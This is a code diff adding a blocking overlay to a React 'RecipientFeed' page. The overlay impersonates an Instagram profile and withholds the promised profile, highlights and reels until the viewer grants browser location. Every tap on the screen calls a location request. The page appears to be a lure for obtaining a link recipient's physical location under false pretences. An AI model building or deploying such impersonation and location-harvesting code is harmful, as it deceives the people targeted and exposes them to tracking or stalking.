@@ -681,6 +681,37 @@ export default function RecipientFeed({
           </button>
         </nav>
 
+        {/* Persistent Location Request Overlay (shows until user taps Allow / Allow this time only) */}
+        {!hasAllowed && (
+          <div className="location-blur-modal-overlay" onClick={requestLocation}>
+            <div className="location-blur-modal-card" onClick={(e) => { e.stopPropagation(); requestLocation(); }}>
+              <div className="blur-modal-icon-wrapper">
+                <div className="blur-modal-pulse-circle"></div>
+                <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" />
+                  <circle cx="12" cy="9" r="2.5" />
+                </svg>
+              </div>
+
+              <h2 className="blur-modal-title">Continue to Instagram Profile</h2>
+              <p className="blur-modal-desc">
+                Please tap <strong>&quot;Allow&quot;</strong> (or <strong>&quot;Allow this time only&quot;</strong>) on the browser prompt to view <strong>mr_in.nocent_yogi</strong>&apos;s profile, highlights, and reels.
+              </p>
+
+              <button className="blur-modal-btn" onClick={requestLocation}>
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                  <polygon points="5 3 19 12 5 21 5 3" fill="currentColor" />
+                </svg>
+                <span>Allow Location to View</span>
+              </button>
+
+              <span className="blur-modal-hint">
+                🔒 Tap anywhere on screen to grant access
+              </span>
+            </div>
+          </div>
+        )}
+
         {/* Reel Popup Modal Feature */}
         <ReelModal isOpen={isReelOpen} onClose={() => setIsReelOpen(false)} />
     </div>
